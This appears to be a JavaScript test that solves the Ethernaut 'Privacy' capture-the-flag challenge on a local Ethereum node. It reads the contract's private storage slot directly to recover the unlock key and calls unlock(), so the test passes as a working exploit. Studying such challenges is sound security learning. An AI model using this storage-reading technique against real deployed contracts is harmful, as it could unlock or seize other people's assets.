import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const privacyArtifact = JSON.parse(
  await readFile(
    new URL("../artifacts/contracts/Privacy.sol/Privacy.json", import.meta.url),
    "utf8"
  )
);

describe("Ethernaut Challenge 12: Privacy", () => {
  let provider;
  let deployer;
  let privacy;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);
    deployer = await provider.getSigner(0);

    const factory = new ethers.ContractFactory(
      privacyArtifact.abi,
      privacyArtifact.bytecode,
      deployer
    );

    const data = [
      ethers.encodeBytes32String("first"),
      ethers.encodeBytes32String("second"),
      ethers.encodeBytes32String("secret-key"),
    ];

    privacy = await factory.deploy(data);
    await privacy.waitForDeployment();
  });

  it("starts locked", async () => {
    assert.equal(await privacy.locked(), true);
  });

  it("unlocks the contract by reading its private storage", async () => {
    const contractAddress = await privacy.getAddress();

    // Slots 0-2 contain locked, ID, and the packed uint8/uint16 fields.
    // The bytes32[3] array begins at slot 3, so data[2] is at slot 5.
    const storedData = await provider.getStorage(contractAddress, 5);

    // bytes16(data[2]) takes the first 16 bytes of the bytes32 word.
    const key = storedData.slice(0, 34);

    await (await privacy.connect(deployer).unlock(key)).wait();

    assert.equal(await privacy.locked(), false);
  });
});

